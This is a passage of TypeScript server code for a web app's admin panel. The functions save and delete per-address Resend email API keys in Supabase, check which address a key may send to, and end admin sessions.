    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) return { ok: false, message: "Enter a valid email." };
    if (!data.apiKey.startsWith("re_")) return { ok: false, message: "Resend API keys start with re_." };

    // Ask Resend which address this key may email, so the key is always stored
    // against an address it can actually deliver to.
    const owner = await detectResendOwner(data.apiKey);
    if (!owner.ok) return { ok: false, message: owner.message ?? "Invalid Resend key." };
    if (owner.email && owner.email !== data.email) {
      return {
        ok: false,
        message: `This Resend key can only email ${owner.email}. Save it for that address instead, or verify a domain in Resend.`,
      };
    }

    const cfg = await loadConfig(supabaseAdmin);
    const map = await loadKeyMap(supabaseAdmin, cfg);
    map[data.email] = data.apiKey;
    await saveKeyMap(supabaseAdmin, map);
    // Re-adding an address undoes an earlier removal.
    const removed = await loadRemovedEmails(supabaseAdmin);
    if (removed.delete(data.email)) await saveRemovedEmails(supabaseAdmin, removed);
    return { ok: true, message: `Resend key saved for ${data.email}. Login codes can now be sent to it.` };

  });

export const adminDeleteResendKey = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => {
    const v = input as { token?: string; email?: string };
    return { token: String(v?.token ?? ""), email: String(v?.email ?? "").trim().toLowerCase() };
  })
  .handler(async ({ data }): Promise<{ ok: boolean; message: string }> => {
    const supabaseAdmin = await requireAdmin(data.token);
    if (PERMANENT_EMAILS.has(data.email)) return { ok: false, message: "This address cannot be removed." };
    const cfg = await loadConfig(supabaseAdmin);
    const map = await loadKeyMap(supabaseAdmin, cfg);
    delete map[data.email];
    await saveKeyMap(supabaseAdmin, map);
    // Remember the removal so a built-in key does not come back on next load.
    const removed = await loadRemovedEmails(supabaseAdmin);
    removed.add(data.email);
    await saveRemovedEmails(supabaseAdmin, removed);
    return { ok: true, message: `Removed ${data.email}. It will no longer receive verification codes.` };
  });


/** Ends an admin session (called when the panel is closed) so re-verification is required. */
export const adminEndSession = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => ({ token: String((input as { token?: string })?.token ?? "") }))
  .handler(async ({ data }): Promise<{ ok: boolean }> => {
    if (!data.token) return { ok: true };
    const supabaseAdmin = await adminClient();
    await supabaseAdmin.from("admin_sessions").delete().eq("token", data.token);
    return { ok: true };
  });
